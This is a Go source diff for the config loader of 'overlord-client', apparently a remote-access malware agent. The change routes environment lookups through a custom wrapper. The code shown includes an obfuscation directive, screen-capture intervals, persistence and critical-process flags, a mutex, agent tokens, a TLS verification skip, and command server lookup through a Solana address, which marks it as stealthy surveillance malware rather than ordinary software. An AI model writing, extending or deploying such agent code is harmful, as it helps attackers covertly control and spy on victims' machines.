@@ -15,6 +15,8 @@ import (
 	"runtime"
 	"strings"
 	"time"
+
+	"overlord-client/cmd/agent/internal/overlordenv"
 )
 
 var AgentVersion = "3.1.1"
@@ -81,29 +83,29 @@ type Config struct {
 
 func Load() Config {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
-	server := strings.TrimSpace(os.Getenv("OVERLORD_SERVER"))
+	server := strings.TrimSpace(overlordenv.Getenv("OVERLORD_SERVER"))
 	if server == "" {
 		server = DefaultServerURL
 	}
 
-	rawServerFlag := strings.TrimSpace(os.Getenv("OVERLORD_SERVER_RAW"))
+	rawServerFlag := strings.TrimSpace(overlordenv.Getenv("OVERLORD_SERVER_RAW"))
 	if rawServerFlag == "" {
 		rawServerFlag = DefaultServerURLIsRaw
 	}
 	rawServerEnabled := isTruthy(rawServerFlag)
 
-	solFlag := strings.TrimSpace(os.Getenv("OVERLORD_SERVER_SOL"))
+	solFlag := strings.TrimSpace(overlordenv.Getenv("OVERLORD_SERVER_SOL"))
 	if solFlag == "" {
 		solFlag = DefaultServerURLIsSol
 	}
 	solEnabled := isTruthy(solFlag)
 
-	solAddress := strings.TrimSpace(os.Getenv("OVERLORD_SOL_ADDRESS"))
+	solAddress := strings.TrimSpace(overlordenv.Getenv("OVERLORD_SOL_ADDRESS"))
 	if solAddress == "" {
 		solAddress = strings.TrimSpace(DefaultSolAddress)
 	}
 
-	solRPCEndpointsStr := strings.TrimSpace(os.Getenv("OVERLORD_SOL_RPC_ENDPOINTS"))
+	solRPCEndpointsStr := strings.TrimSpace(overlordenv.Getenv("OVERLORD_SOL_RPC_ENDPOINTS"))
 	if solRPCEndpointsStr == "" {
 		solRPCEndpointsStr = strings.TrimSpace(DefaultSolRPCEndpoints)
 	}
@@ -120,7 +122,7 @@ func Load() Config {
 	serverURLs := []string{}
 	rawServerListURL := ""
 	if solEnabled && solAddress != "" && len(solRPCEndpoints) > 0 {
-		agentToken := strings.TrimSpace(os.Getenv("OVERLORD_AGENT_TOKEN"))
+		agentToken := strings.TrimSpace(overlordenv.Getenv("OVERLORD_AGENT_TOKEN"))
 		if agentToken == "" {
 			agentToken = strings.TrimSpace(DefaultAgentToken)
 		}
@@ -156,46 +158,46 @@ func Load() Config {
 	fileSettings := readSettings()
 	defaultHWID := deriveHWID()
 	interval := 20 * time.Second
-	if v := strings.TrimSpace(os.Getenv("OVERLORD_CAPTURE_INTERVAL")); v != "" {
+	if v := strings.TrimSpace(overlordenv.Getenv("OVERLORD_CAPTURE_INTERVAL")); v != "" {
 		if parsed, err := time.ParseDuration(v); err == nil && parsed > 0 {
 			interval = parsed
 		}
 	}
 
 	disableCapture := false
-	if v := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_DISABLE_CAPTURE"))); v != "" {
+	if v := strings.ToLower(strings.TrimSpace(overlordenv.Getenv("OVERLORD_DISABLE_CAPTURE"))); v != "" {
 		disableCapture = v == "true" || v == "1" || v == "yes"
 	}
 
 	enablePersistence := strings.ToLower(DefaultPersistence) == "true"
-	if v := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_ENABLE_PERSISTENCE"))); v != "" {
+	if v := strings.ToLower(strings.TrimSpace(overlordenv.Getenv("OVERLORD_ENABLE_PERSISTENCE"))); v != "" {
 		enablePersistence = v == "true" || v == "1" || v == "yes"
 	}
 
 	criticalProcess := strings.ToLower(DefaultCriticalProcess) == "true"
 
 	fetchPublicIP := isTruthy(DefaultFetchPublicIP)
-	if v := strings.TrimSpace(os.Getenv("OVERLORD_FETCH_PUBLIC_IP")); v != "" {
+	if v := strings.TrimSpace(overlordenv.Getenv("OVERLORD_FETCH_PUBLIC_IP")); v != "" {
 		fetchPublicIP = isTruthy(v)
 	}
 
 	tlsInsecureSkipVerify := false
-	if v := strings.ToLower(strings.TrimSpace(os.Getenv("OVERLORD_TLS_INSECURE_SKIP_VERIFY"))); v != "" {
+	if v := strings.ToLower(strings.TrimSpace(overlordenv.Getenv("OVERLORD_TLS_INSECURE_SKIP_VERIFY"))); v != "" {
 		tlsInsecureSkipVerify = v == "true" || v == "1" || v == "yes"
 	}
-	tlsCAPath := strings.TrimSpace(os.Getenv("OVERLORD_TLS_CA"))
-	tlsClientCert := strings.TrimSpace(os.Getenv("OVERLORD_TLS_CLIENT_CERT"))
-	tlsClientKey := strings.TrimSpace(os.Getenv("OVERLORD_TLS_CLIENT_KEY"))
+	tlsCAPath := strings.TrimSpace(overlordenv.Getenv("OVERLORD_TLS_CA"))
+	tlsClientCert := strings.TrimSpace(overlordenv.Getenv("OVERLORD_TLS_CLIENT_CERT"))
+	tlsClientKey := strings.TrimSpace(overlordenv.Getenv("OVERLORD_TLS_CLIENT_KEY"))
 	tlsSPKIPins := parseCommaList(firstNonEmpty(
-		strings.TrimSpace(os.Getenv("OVERLORD_TLS_SPKI_PINS")),
+		strings.TrimSpace(overlordenv.Getenv("OVERLORD_TLS_SPKI_PINS")),
 		DefaultTLSSPKIPins,
 	))
-	agentToken := strings.TrimSpace(os.Getenv("OVERLORD_AGENT_TOKEN"))
+	agentToken := strings.TrimSpace(overlordenv.Getenv("OVERLORD_AGENT_TOKEN"))
 	if agentToken == "" {
 		agentToken = strings.TrimSpace(DefaultAgentToken)
 	}
 
-	mutex := strings.TrimSpace(os.Getenv("OVERLORD_MUTEX"))
+	mutex := strings.TrimSpace(overlordenv.Getenv("OVERLORD_MUTEX"))
 	if mutex == "" {
 		mutex = DefaultMutex
 	}
